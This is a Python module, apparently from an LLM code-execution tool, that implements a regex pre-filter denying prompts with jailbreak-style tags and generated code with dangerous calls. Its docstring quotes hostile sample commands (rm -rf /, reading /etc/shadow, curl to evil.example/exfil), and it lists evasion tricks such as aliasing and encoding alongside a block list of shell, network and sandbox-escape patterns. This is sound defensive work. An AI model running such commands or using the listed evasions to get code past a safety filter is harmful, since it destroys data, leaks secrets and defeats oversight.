"""Policy gate — a cheap first-pass filter and audit log, NOT a security boundary.

Two scans:

1. `scan_prompt(text)` — looks for explicit jailbreak tags users might inject
   to coerce dangerous behavior, e.g.::

        [SHELL: rm -rf /]
        [KERNEL: cat /etc/shadow]
        [NET: curl https://evil.example/exfil]

   The gate denies before we even pay for an LLM call.

2. `scan_code(code)` — looks for dangerous imports/calls in LLM-generated
   code: `os.system`, `subprocess`, sockets, eval/exec/compile, dynamic
   imports, filesystem deletes, etc.

WHAT THIS IS (and isn't), D12 — read before quoting any detection number:
  - It is a **regex scan of source text**. That makes it trivially bypassable:
    aliasing (`f = os.system`), `getattr`/`vars()` indirection, string-built
    names, base64/hex encoding, or any construct that doesn't match a literal
    pattern sails straight through. We add a few more patterns below, but the
    set is and always will be incomplete.
  - Its real value is **(a) blocking the obvious stuff before spending an LLM
    call, and (b) producing an auditable DENY log** (surfaced to the dashboard
    via the ring trace log) — not security.
  - **The actual isolation boundary is the Docker sandbox** (`--network=none
    --read-only --cap-drop=ALL --pids-limit --memory`, non-root). Treat the
    gate's detection % as "how good is the cheap pre-filter", never as a safety
    guarantee. See docs/EVALUATION.md.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum
from typing import Iterable, Optional


class Decision(str, Enum):
    ALLOW = "ALLOW"
    DENY = "DENY"


@dataclass
class GateResult:
    decision: Decision
    reason: Optional[str] = None
    matched: Optional[str] = None        # the literal substring that triggered DENY
    rule: Optional[str] = None           # which rule fired (for logs)

    @property
    def allowed(self) -> bool:
        return self.decision is Decision.ALLOW


# --- prompt-side rules ------------------------------------------------------

PROMPT_TAG_PATTERN = re.compile(
    r"\[\s*(?P<kind>SHELL|KERNEL|NET|SUDO|EXFIL|EXEC)\s*:[^\]]*\]",
    re.IGNORECASE,
)


def scan_prompt(text: str) -> GateResult:
    """Reject prompts containing jailbreak tags like `[SHELL: rm -rf /]`."""
    m = PROMPT_TAG_PATTERN.search(text or "")
    if m:
        return GateResult(
            decision=Decision.DENY,
            reason=f"prompt contains forbidden tag [{m.group('kind').upper()}]",
            matched=m.group(0),
            rule="prompt.jailbreak_tag",
        )
    return GateResult(decision=Decision.ALLOW)


# --- code-side rules --------------------------------------------------------

# Each rule is (regex, rule_id, human reason). Order matters only for which
# match we report first; all will be tried.
_CODE_RULES: tuple[tuple[re.Pattern, str, str], ...] = (
    (re.compile(r"\bos\.system\s*\("),
        "code.os_system", "os.system() invokes a real shell"),
    (re.compile(r"\bsubprocess\b"),
        "code.subprocess", "subprocess module spawns processes"),
    (re.compile(r"\b__import__\s*\(\s*['\"]os['\"]"),
        "code.import_os_dynamic", "dynamic __import__('os') bypasses static analysis"),
    (re.compile(r"\beval\s*\("),
        "code.eval", "eval() executes arbitrary expressions"),
    (re.compile(r"\bexec\s*\("),
        "code.exec", "exec() executes arbitrary statements"),
    (re.compile(r"\bopen\s*\(\s*['\"]/etc/"),
        "code.read_system_files", "reading /etc/* is forbidden"),
    (re.compile(r"\bsocket\.(socket|create_connection)\s*\("),
        "code.network", "raw sockets are forbidden in sandbox"),
    (re.compile(r"\brequests\.|urllib\.request\.|urllib3\.|httpx\."),
        "code.network_lib", "HTTP libraries are forbidden in sandbox"),
    (re.compile(r"\brm\s+-rf\s+/"),
        "code.rm_rf_root", "`rm -rf /` pattern in source"),
    (re.compile(r"\b(shutil\.rmtree)\s*\(\s*['\"]/"),
        "code.shutil_rmtree_root", "shutil.rmtree on an absolute root path"),
    # --- added patterns (D12): catch a few cheap evasions. Appended after the
    # rules above so existing rule-IDs still fire first for their cases. This
    # set is still NOT exhaustive — the gate is a pre-filter, not a boundary.
    (re.compile(r"\bos\.popen\s*\("),
        "code.os_popen", "os.popen() runs a shell command"),
    (re.compile(r"\b__import__\s*\("),
        "code.import_dynamic", "dynamic __import__() of any module bypasses static checks"),
    # Builtin compile( only — the negative lookbehind avoids false-matching the
    # ubiquitous `re.compile(...)` / `model.compile(...)` method calls.
    (re.compile(r"(?<![.\w])compile\s*\("),
        "code.compile", "compile() builds code objects for exec/eval"),
    (re.compile(r"\bpty\.(spawn|fork|openpty)\s*\("),
        "code.pty", "pty.* can spawn an interactive shell"),
    (re.compile(r"\b__builtins__\b"),
        "code.builtins_access", "touching __builtins__ is a sandbox-escape pattern"),
    (re.compile(r"\bglobals\s*\(\s*\)\s*\["),
        "code.globals_index", "indexing globals() is used to reach hidden builtins"),
    (re.compile(r"\bos\.(remove|unlink|rmdir)\s*\(\s*['\"]/"),
        "code.fs_delete_abs", "deleting an absolute path (e.g. /etc/*) is forbidden"),
)


def scan_code(code: str) -> GateResult:
    """Reject LLM-generated code containing dangerous patterns."""
    if not code:
        return GateResult(decision=Decision.ALLOW)
    for pattern, rule_id, reason in _CODE_RULES:
        m = pattern.search(code)
        if m:
            return GateResult(
                decision=Decision.DENY,
                reason=reason,
                matched=m.group(0),
                rule=rule_id,
            )
    return GateResult(decision=Decision.ALLOW)


# --- convenience ------------------------------------------------------------

def check(text: str, *, kind: str) -> GateResult:
    """One-liner used by the executor. `kind` is 'prompt' or 'code'."""
    if kind == "prompt":
        return scan_prompt(text)
    if kind == "code":
        return scan_code(text)
    raise ValueError(f"unknown gate kind: {kind!r}")


def iter_code_rule_ids() -> Iterable[str]:
    """For docs/tests: list every rule the gate enforces."""
    return [r[1] for r in _CODE_RULES]
